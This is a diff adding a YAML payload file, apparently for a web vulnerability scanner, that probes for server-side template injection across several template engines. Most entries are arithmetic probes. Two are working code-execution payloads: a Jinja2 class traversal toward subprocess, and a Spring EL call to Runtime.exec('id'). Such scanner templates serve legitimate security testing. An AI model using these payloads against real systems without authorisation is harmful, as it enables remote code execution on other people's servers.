@@ -1,0 +1,47 @@
+id: ssti-generic
+name: Server-side template injection
+context:
+  any: true
+
+payloads:
+  - value: "{{7*7}}"
+    detect: { body_contains: "49" }
+    id: ssti-jinja-01
+    title: "SSTI — Jinja2/Twig expression evaluation"
+    severity: critical
+    cwe: CWE-1336
+
+  - value: "${7*7}"
+    detect: { body_contains: "49" }
+    id: ssti-el-01
+    title: "SSTI — EL/OGNL expression evaluation"
+    severity: critical
+    cwe: CWE-1336
+
+  - value: "#{7*7}"
+    detect: { body_contains: "49" }
+    id: ssti-ruby-01
+    title: "SSTI — Ruby ERB expression evaluation"
+    severity: critical
+    cwe: CWE-1336
+
+  - value: "<%= 7*7 %>"
+    detect: { body_contains: "49" }
+    id: ssti-ejs-01
+    title: "SSTI — EJS/ASP expression evaluation"
+    severity: critical
+    cwe: CWE-1336
+
+  - value: "{{''.__class__.__mro__[1].__subclasses__()}}"
+    detect: { body_regex: "class.*subprocess|class.*Popen" }
+    id: ssti-jinja-rce-01
+    title: "SSTI — Jinja2 class traversal (RCE vector)"
+    severity: critical
+    cwe: CWE-1336
+
+  - value: "*{T(java.lang.Runtime).getRuntime().exec('id')}"
+    detect: { body_regex: "uid=" }
+    id: ssti-spring-01
+    title: "SSTI — Spring EL code execution"
+    severity: critical
+    cwe: CWE-1336
